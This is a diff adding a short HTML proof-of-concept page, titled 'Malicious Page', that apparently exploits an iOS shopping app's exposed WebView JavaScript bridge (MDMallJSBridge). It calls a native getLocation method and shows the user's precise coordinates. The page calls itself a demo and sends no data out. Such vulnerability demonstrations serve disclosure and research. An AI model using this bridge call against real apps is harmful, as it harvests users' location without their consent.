@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            overflow-wrap: break-word; 
+        }
+
+        .bold-and-larger {
+            font-weight: bold; 
+            font-size: 1.5em; 
+        }
+
+        .larger {
+            font-weight: bold; 
+            font-size: 1.2em; 
+        }
+
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p><span class="bold-and-larger">An attacker can:</span></p>
+
+    <p><span class="larger">Get Your Geolocation Info:</span></p>
+    <p style="font-size: 15px;" id="PreciseGeolocation"></p> 
+    <p style="font-size: 15px;" id="Country"></p>
+    <p style="font-size: 15px;" id="Province"></p>
+    <p style="font-size: 15px;" id="City"></p>
+    <p style="font-size: 15px;" id="District"></p>
+    <p style="font-size: 15px;" id="PreciseGeolocation"></p>
+    <p style="font-size: 15px;" id="RegionCode"></p>
+
+    <br><br>
+    <script>
+
+    window.mdMallBridge = {}
+    window.mdMallBridge.callbackFromNative = function(callbackId, res, boolVal){
+        var json = JSON.parse(res);
+        switch(callbackId){
+            case "cb_getLocation":
+            document.getElementById("PreciseGeolocation").innerText = "Your Precise Geolocation: \n" + " (" + json.data.longitude + ", " + json.data.latitude + ")";
+                break;
+        }
+    }
+
+    window.webkit.messageHandlers.MDMallJSBridge.postMessage({ 
+        callbackId: "cb_getLocation", 
+        data: '{\"name\":\"getLocation\",\"params\":{}}'
+    });
+
+
+    </script>
+
+</body>
+
+</html>
